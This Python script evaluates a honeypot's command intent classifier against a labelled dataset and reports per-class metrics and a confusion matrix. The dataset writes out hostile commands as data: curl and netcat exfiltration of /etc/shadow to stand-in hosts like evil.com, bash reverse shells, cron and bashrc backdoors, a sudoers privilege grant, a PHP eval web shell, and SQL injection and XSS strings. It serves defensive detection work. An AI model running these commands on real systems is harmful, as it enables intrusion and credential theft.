#!/usr/bin/env python3
"""
Intent Classifier Evaluation Script
用標注好的 ground-truth 資料集評估 intent classifier 的精準度。
輸出 per-class precision/recall/F1 + 混淆矩陣 + 整體 accuracy。

Usage:
    cd HoneyPot/honeypot
    .venv/bin/python scripts/eval_classifier.py [--json]
"""

import argparse
import json
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))
from layer2.intent_classifier import classify

# ── Ground-truth 標注資料集 ──────────────────────────────────────────────────
# (command, expected_intent)
DATASET: list[tuple[str, str]] = [
    # reconnaissance (19 筆)
    ("whoami", "reconnaissance"),
    ("id", "reconnaissance"),
    ("uname -a", "reconnaissance"),
    ("uname -r", "reconnaissance"),
    ("ls -la /", "reconnaissance"),
    ("ls /home", "reconnaissance"),
    ("cat /etc/passwd", "reconnaissance"),
    ("hostname", "reconnaissance"),
    ("ps aux", "reconnaissance"),
    ("ps -ef", "reconnaissance"),
    ("netstat -tulpn", "reconnaissance"),
    ("ss -tulpn", "reconnaissance"),
    ("ifconfig eth0", "reconnaissance"),
    ("ip addr show", "reconnaissance"),
    ("find / -name '*.conf' 2>/dev/null", "reconnaissance"),
    ("find /var -name '*.log'", "reconnaissance"),
    ("grep -r 'password' /etc/", "reconnaissance"),
    ("env", "reconnaissance"),
    ("history", "reconnaissance"),

    # privilege_escalation (9 筆)
    ("sudo -l", "privilege_escalation"),
    ("sudo su -", "privilege_escalation"),
    ("su root", "privilege_escalation"),
    ("chmod 777 /etc/passwd", "privilege_escalation"),
    ("chmod 4755 /bin/bash", "privilege_escalation"),
    ("cat /etc/sudoers", "privilege_escalation"),
    ("find / -perm -u=s -type f 2>/dev/null", "privilege_escalation"),
    ("passwd root", "privilege_escalation"),
    ("useradd -m -s /bin/bash hacker", "privilege_escalation"),

    # data_exfiltration (10 筆)
    ("curl http://evil.com/exfil -d @/etc/shadow", "data_exfiltration"),
    ("wget http://attacker.com/collect.php?data=$(cat /etc/passwd)", "data_exfiltration"),
    ("scp /etc/shadow attacker@10.99.0.1:/tmp/", "data_exfiltration"),
    ("nc -e /bin/bash evil.com 4444", "data_exfiltration"),
    ("nc 10.99.0.1 9999 < /etc/shadow", "data_exfiltration"),
    ("cat /etc/shadow | base64 | curl -d @- http://evil.com/", "data_exfiltration"),
    ("bash -i >& /dev/tcp/10.99.0.1/4444 0>&1", "data_exfiltration"),
    ("tar czf - /home/admin | curl -T - http://evil.com/backup.tgz", "data_exfiltration"),
    ("cat /home/admin/backup.sql | base64", "data_exfiltration"),
    ("python3 -c 'import socket; ...'", "data_exfiltration"),

    # persistence (9 筆)
    ("crontab -e", "persistence"),
    ("echo '* * * * * /tmp/backdoor' >> /etc/crontab", "persistence"),
    ("echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys", "persistence"),
    ("systemctl enable malicious.service", "persistence"),
    ("echo 'bash -i >& /dev/tcp/10.99.0.1/4444 0>&1' >> ~/.bashrc", "persistence"),
    ("cp /bin/bash /tmp/.hidden && chmod u+s /tmp/.hidden", "privilege_escalation"),
    ("at now + 1 minute -f /tmp/evil.sh", "persistence"),
    ("(crontab -l; echo '@reboot /tmp/evil.sh') | crontab -", "persistence"),
    ("echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers", "privilege_escalation"),

    # lateral_movement (8 筆)
    ("ssh deploy@10.0.0.5", "lateral_movement"),
    ("ssh -i ~/.ssh/id_rsa root@10.0.0.10", "lateral_movement"),
    ("nmap -sV 10.0.0.0/24", "lateral_movement"),
    ("nmap -p 22,80,443 10.0.0.0/24", "lateral_movement"),
    ("ping 10.0.0.5", "lateral_movement"),
    ("ping -c 4 10.0.0.1", "lateral_movement"),
    ("cat /etc/hosts", "lateral_movement"),
    ("arp -a", "lateral_movement"),

    # credential_harvesting (5 筆)
    ("curl http://localhost/wp-login.php -d 'log=admin&pwd=password123'", "credential_harvesting"),
    ("curl http://localhost/phpmyadmin/", "credential_harvesting"),
    ("curl 'http://localhost/wp-login.php?log=admin&pwd=test'", "credential_harvesting"),
    ("GET /phpmyadmin HTTP/1.1", "credential_harvesting"),
    ("POST /wp-login.php pma_username=root&pma_password=root", "credential_harvesting"),

    # web_recon (6 筆)
    ("curl http://localhost/.env", "web_recon"),
    ("curl http://localhost/wp-config.php", "web_recon"),
    ("curl http://localhost/xmlrpc.php", "web_recon"),
    ("curl http://localhost/.git/config", "web_recon"),
    ("curl http://localhost/admin/config", "web_recon"),
    ("GET /.env HTTP/1.1", "web_recon"),

    # injection_attempt (8 筆)
    ("' UNION SELECT table_name FROM information_schema.tables--", "injection_attempt"),
    ("1' OR '1'='1", "injection_attempt"),
    ("<script>alert(document.cookie)</script>", "injection_attempt"),
    ("' OR 1=1--", "injection_attempt"),
    ("<?php eval($_GET['cmd']); ?>", "injection_attempt"),
    ("echo base64_decode('c3lzdGVtKCRfR0VUWydjbWQnXSk=')", "injection_attempt"),
    ("' AND 1=1 UNION SELECT 1,2,3--", "injection_attempt"),
    ("<img src=x onerror=alert(1)>", "injection_attempt"),

    # unknown (6 筆)
    ("echo hello world", "unknown"),
    ("vim /tmp/test.txt", "unknown"),
    ("date", "unknown"),
    ("uptime", "unknown"),
    ("df -h", "unknown"),
    ("free -m", "unknown"),
]

ALL_INTENTS = [
    "reconnaissance", "privilege_escalation", "data_exfiltration",
    "persistence", "lateral_movement", "credential_harvesting",
    "web_recon", "injection_attempt", "unknown",
]


def evaluate() -> dict:
    tp: dict[str, int] = {i: 0 for i in ALL_INTENTS}
    fp: dict[str, int] = {i: 0 for i in ALL_INTENTS}
    fn: dict[str, int] = {i: 0 for i in ALL_INTENTS}
    confusion: dict[str, dict[str, int]] = {
        a: {b: 0 for b in ALL_INTENTS} for a in ALL_INTENTS
    }
    errors: list[dict] = []

    for command, expected in DATASET:
        predicted, confidence = classify(command)
        confusion[expected][predicted] += 1
        if predicted == expected:
            tp[predicted] += 1
        else:
            fp[predicted] += 1
            fn[expected] += 1
            errors.append({"command": command, "expected": expected, "predicted": predicted})

    total = len(DATASET)
    correct = sum(tp.values())

    per_class: dict[str, dict] = {}
    for intent in ALL_INTENTS:
        support = tp[intent] + fn[intent]
        prec = tp[intent] / (tp[intent] + fp[intent]) if (tp[intent] + fp[intent]) > 0 else 0.0
        rec  = tp[intent] / support if support > 0 else 0.0
        f1   = 2 * prec * rec / (prec + rec) if (prec + rec) > 0 else 0.0
        per_class[intent] = {
            "precision": round(prec, 3),
            "recall": round(rec, 3),
            "f1": round(f1, 3),
            "support": support,
            "tp": tp[intent],
            "fp": fp[intent],
            "fn": fn[intent],
        }

    macro_f1 = sum(v["f1"] for v in per_class.values()) / len(ALL_INTENTS)

    return {
        "accuracy": round(correct / total, 4),
        "macro_f1": round(macro_f1, 4),
        "total": total,
        "correct": correct,
        "per_class": per_class,
        "confusion_matrix": confusion,
        "errors": errors,
    }


def print_report(result: dict) -> None:
    W = 80
    print("=" * W)
    print("  Intent Classifier Evaluation Report")
    print("=" * W)
    print(f"  Total samples : {result['total']}")
    print(f"  Correct       : {result['correct']}")
    print(f"  Accuracy      : {result['accuracy']:.1%}")
    print(f"  Macro F1      : {result['macro_f1']:.3f}")
    print()

    # per-class table
    header = f"{'Intent':<25} {'Precision':>9} {'Recall':>7} {'F1':>7} {'Support':>8}"
    print(header)
    print("-" * W)
    for intent, m in result["per_class"].items():
        flag = " ⚠" if m["f1"] < 0.8 and m["support"] > 0 else ""
        print(
            f"{intent:<25} {m['precision']:>9.3f} {m['recall']:>7.3f}"
            f" {m['f1']:>7.3f} {m['support']:>8}{flag}"
        )

    # confusion matrix (shortened labels)
    SHORT = {
        "reconnaissance": "recon",
        "privilege_escalation": "privesc",
        "data_exfiltration": "exfil",
        "persistence": "persist",
        "lateral_movement": "lateral",
        "credential_harvesting": "cred",
        "web_recon": "web_recon",
        "injection_attempt": "inject",
        "unknown": "unknown",
    }
    labels = list(SHORT.values())
    print()
    print("  Confusion Matrix  (rows = actual, cols = predicted)")
    print()
    col_w = 10
    print(" " * 12 + "".join(f"{l:>{col_w}}" for l in labels))
    print(" " * 12 + "-" * (col_w * len(labels)))
    cm = result["confusion_matrix"]
    for actual in ALL_INTENTS:
        row = " ".join(f"{cm[actual].get(pred, 0):>{col_w}}" for pred in ALL_INTENTS)
        row_label = SHORT[actual]
        print(f"{row_label:>11} |{row}")

    # misclassified
    if result["errors"]:
        print()
        print(f"  Misclassified ({len(result['errors'])} samples):")
        print("-" * W)
        for e in result["errors"]:
            print(f"  [{e['expected']:>25}] → [{e['predicted']:<25}]  cmd: {e['command'][:50]}")

    print("=" * W)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Evaluate intent classifier")
    parser.add_argument("--json", action="store_true", help="Output raw JSON instead of report")
    args = parser.parse_args()

    result = evaluate()

    if args.json:
        print(json.dumps(result, indent=2, ensure_ascii=False))
    else:
        print_report(result)
